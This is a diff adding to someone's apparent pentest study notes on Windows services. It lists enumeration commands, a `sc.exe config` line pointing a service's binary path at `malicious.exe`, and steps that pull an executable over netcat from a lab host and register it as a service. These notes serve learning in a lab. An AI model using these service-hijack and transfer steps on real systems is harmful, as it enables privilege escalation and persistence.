@@ -117,3 +117,48 @@ openssl s_client -connect domain.com:443 # GET / HTTP/1.0
 
   https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/http
 
+
+
+#Windows
+##Windows services
+PS
+  Get-service
+  Get-Service | select-object Displayname, Status, ServiceName, Can*
+  Get-CimInstance -ClassNAme win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}
+  Get-CimInstance -ClassNAme win32_service | Select Name,State,PathName
+THIS WORK CMD AND PS
+  sc.exe query
+THIS WORK ONLY PS
+  sc.exe query | select-string service_name
+Administraotr CMD  
+  sc.exe stop SERVICE
+  sc.exe start SERVICE
+  sc.exe qc SERVICE
+  sc.exe config SERVICE binPath="C:\Users\Quickemu\Downloads\malicious.exe"
+  sc.exe sdshow SERVICE
+    ConvertFrom-SddlString -Sddl SDDL
+    ^https://www.advancedinstaller.com/forums/viewtopic.php?t=49990
+PS
+  wmic process list full | select-string 'executablepath=C:'
+  wmic process list full | select-string 'executablepath=C:' | select-string -notmatch 'system32|syswow'
+ADD NEW SERVICE
+CMD
+  sc.exe create SERVICENAME binPath="PATH-TO-EXECUTABLE"
+
+Linux Compile
+  X86_64-w64-ming32-gcc -mwindows -municode -O2 -s -o simpleService.exe simpleService.c
+  ^https://gist.github.com/mmmunk/0b0adbccb6b91e778e3a6c6b47908c9c
+
+####ONE BASIC MOVEMENT FOR TRANSFER
+Linux
+  nc -lnvp 4321 < simpleService.exe
+Windows CMD
+  cd Downloads
+  .\nc64.exe 192.168.122.1 4321 > simpleService.exe
+  
+TARGET MACHINE ADMIN CMD
+  sc.exe create SimpleService binPAth= "C:\USers\Quickemu\Downloads\simpleService.exe"
+  sc.exe qc SimpleService
+  sc.exe start SimpleService
+  sc.exe stop SimpleService
+  sc.exe delete SimpleService
